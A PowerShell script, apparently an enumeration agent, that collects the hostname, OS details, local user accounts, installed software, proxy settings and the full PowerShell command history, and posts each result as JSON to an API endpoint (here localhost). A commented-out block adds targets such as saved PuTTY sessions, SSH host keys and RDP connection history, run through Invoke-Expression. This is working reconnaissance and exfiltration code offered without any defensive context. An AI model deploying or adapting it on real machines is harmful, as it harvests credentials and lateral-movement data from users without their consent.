# Write-Host "Hostname"
# Write-Host "--------"
# Hostname

# Get-ComputerInfo | Select-Object OSName, WindowsVersion, OsArchitecture

# Write-Host "`n"

$apiUrl = "http://localhost:3000/api/endpoint"

$apiCommandUrl = "http://localhost:3000/api/endpoint/command"

function getHostname {

    $hostname = HOSTNAME.EXE

    $hostnameJson = @{
        hostname = $hostname
    } | ConvertTo-Json

    $hostnameJson

    $response = Invoke-WebRequest -Uri $apiUrl -Method Post -Body $hostnameJson -ContentType "application/json"

    if ($response.StatusCode -eq "OK") {
        return $true
    }

}

function osDetails {
    $enumurate = Get-ComputerInfo | Select-Object OSName, WindowsVersion, OsArchitecture

    $commandObject = @{
        "OS-Details" = $enumurate
    } | ConvertTo-Json

    $commandObject

    $response = Invoke-WebRequest -Uri $apiUrl -Method Post -Body $commandObject -ContentType "application/json"

    if ($response.StatusCode -eq "OK") {
        return $true
    }
}

function getLocalUsers {

    $users = Get-LocalUser

    $localUsersJSON = @{
        localUsers = $users
    } | ConvertTo-Json

    $localUsersJSON

    $response = Invoke-WebRequest -Uri $apiUrl -Method Post -Body $localUsersJSON -ContentType "application/json"

    if ($response.StatusCode -eq "OK") {
        return $true
    }

}

# Get-LocalUser
function softwareInventory {
    
    $InstalledSoftware = Get-ChildItem HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall 

    $jsonObject = @{}

    $commandOutput = foreach ($obj in $InstalledSoftware) {
        $Name = $obj.GetValue('DisplayName')
        if ($Name -ne $null) {
            $Version = $obj.GetValue('DisplayVersion')
            if ($jsonObject.ContainsKey($Name)) {
                Write-Host $Name
            }
            else {
                $jsonObject.Add($Name, $Version)
            }    
        }
        else {

        }
    }

    $jsonString = $jsonObject | ConvertTo-Json
    
    Write-Host $jsonString

    $commandObject = @{
        "Inventory of Installed Software" = $jsonObject
    } | ConvertTo-Json

    $response = Invoke-WebRequest -Uri $apiUrl -Method Post -Body $commandObject -ContentType "application/json"
    
    if ($response.StatusCode -eq "OK") {
        return $true
    }
}

function getProxyDetails {

    $systemProxy = netsh winhttp show proxy
    $currentUserProxy = Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"

    $systemProxyJSON = @{
        system     = $systemProxy
        curentUser = $currentUserProxy
    } | ConvertTo-Json

    $systemProxyJSON

    $response = Invoke-WebRequest -Uri $apiUrl -Method Post -Body $systemProxyJSON -ContentType "application/json"

    if ($response.StatusCode -eq "OK") {
        return $true
    }
}

function commandHistory {

    $historyContent = Get-Content (Get-PSReadlineOption).HistorySavePath 

    $jsonArray = @()
    foreach ($command in $historyContent) {
        $jsonArray += $command
    }

    $commandHistoryJSON = @{
        commandHistory = $jsonArray
    } | ConvertTo-Json

    $response = Invoke-WebRequest -Uri $apiUrl -Method Post -Body $commandHistoryJSON -ContentType "application/json"

    if ($response.StatusCode -eq "OK") {
        Write-Host "OK"
        return $true
    }
}

# if (commandHistory -eq $true) {
#     Write-Host "Ok"
# }

# getProxyDetails
getHostname
osDetails
getLocalUsers
softwareInventory
getProxyDetails
commandHistory
# # # Create an empty dictionary (hashtable)
# $commandDictionary = [ordered]@{    
#     "Hostname" = "Hostname"
#     "Operating System Name, Architecture, and Version" = "Get-ComputerInfo | Select-Object OSName, WindowsVersion, OsArchitecture"
#     "List of Users on the Machine" = "Get-LocalUser"
#     "Configuration of Proxy Settings" = "netsh winhttp show proxy"
#     "Catalog of Saved PuTTY Sessions" = "Get-Item -Path Registry::HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions | ft"
#     "Record of Recent PuTTY Sessions" = "Get-Item -Path Registry::HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Jumplist | ft"
#     "Storage of PuTTY SSH Keys" = "Get-Item -Path Registry::HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\SshHostKeys | ft"
#     "History of Past Remote Desktop Protocol (RDP) Sessions" = "Get-Item -Path 'Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Terminal Server Client\Default\' | ft"
#     "Log of Previous Run Commands" = "Get-History"
# }

# $commandDictionary 

# Write-Host "`n"

# foreach ($key in $commandDictionary.GetEnumerator()) {
#     Write-Host "Executing $key..."
#     Invoke-Expression $key.Value
#     Write-Host "`n"
# }
